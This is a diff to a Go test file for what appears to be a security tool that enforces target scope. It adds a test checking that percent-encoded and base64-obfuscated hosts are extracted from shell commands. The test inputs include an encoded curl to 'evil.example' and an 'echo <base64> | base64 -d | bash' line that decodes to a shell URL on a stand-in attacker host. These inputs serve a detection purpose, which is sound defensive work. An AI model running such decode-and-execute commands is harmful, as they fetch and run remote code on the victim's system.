@@ -51,13 +51,13 @@ func TestTargetInScope(t *testing.T) {
 		{"example.com", true},
 		{"api.example.com", true},
 		{"notexample.com", false},
-		{"10.0.0.5", true},      // ip row
-		{"10.0.0.6", true},      // not the ip row, but inside the scope cidr
-		{"10.0.0.9", true},      // inside scope cidr
-		{"10.0.1.1", false},     // outside scope cidr
-		{"10.0.0.0/25", true},   // target cidr fully inside scope cidr
-		{"10.0.0.0/16", false},  // bigger than the scope cidr
-		{"myshop.cn", true},     // keyword substring
+		{"10.0.0.5", true},     // ip row
+		{"10.0.0.6", true},     // not the ip row, but inside the scope cidr
+		{"10.0.0.9", true},     // inside scope cidr
+		{"10.0.1.1", false},    // outside scope cidr
+		{"10.0.0.0/25", true},  // target cidr fully inside scope cidr
+		{"10.0.0.0/16", false}, // bigger than the scope cidr
+		{"myshop.cn", true},    // keyword substring
 		{"other.cn", false},
 	}
 	for _, tc := range cases {
@@ -88,5 +88,42 @@ func TestScopeModeEnvOverride(t *testing.T) {
 	t.Setenv("ARTEX_SCOPE_ENFORCEMENT", "off")
 	if got := i.ScopeMode(); got != "off" {
 		t.Fatalf("got %q want off", got)
+	}
+}
+
+// TestExtractTargetsDetailedDecodesObfuscation pins the P12 anti-obfuscation
+// pass: percent-encoded and one-level base64 targets are still extracted, with
+// their source labelled for the audit trail; binary base64 noise is rejected.
+func TestExtractTargetsDetailedDecodesObfuscation(t *testing.T) {
+	// 百分号编码的 URL → 1 轮解码后可见，来源标注 raw 与 decoded 并存
+	hits := ExtractTargetsDetailed(`curl "http://%65%76%69%6c%2e%65%78%61%6d%70%6c%65/x"`)
+	byValue := map[string]string{}
+	for _, h := range hits {
+		byValue[h.Value] = h.Source
+	}
+	if src, ok := byValue["evil.example"]; !ok || src != "percent_decoded:1" {
+		t.Fatalf("percent-encoded target not extracted: %+v", hits)
+	}
+
+	// base64 段（echo <b64> | base64 -d | bash）
+	hits = ExtractTargetsDetailed(`echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash`)
+	found := false
+	for _, h := range hits {
+		if h.Value == "evil.example.com" && h.Source == "base64" {
+			found = true
+		}
+	}
+	if !found {
+		t.Fatalf("base64 target not extracted: %+v", hits)
+	}
+
+	// 纯二进制/噪声 base64 不得被当成目标来源（解出乱码或没有 url/域名标记即丢弃）
+	if got := decodeBase64Segments(`echo AAAAAAAAAAAAAAAAAAAAAAAAAAAA | base64 -d`); len(got) != 0 {
+		t.Fatalf("binary base64 noise must be rejected: %v", got)
+	}
+
+	// 明文行为不回归
+	if got := ExtractTargets(`curl https://plain.example.com/x`); len(got) != 1 || got[0] != "plain.example.com" {
+		t.Fatalf("plain extraction regressed: %v", got)
 	}
 }
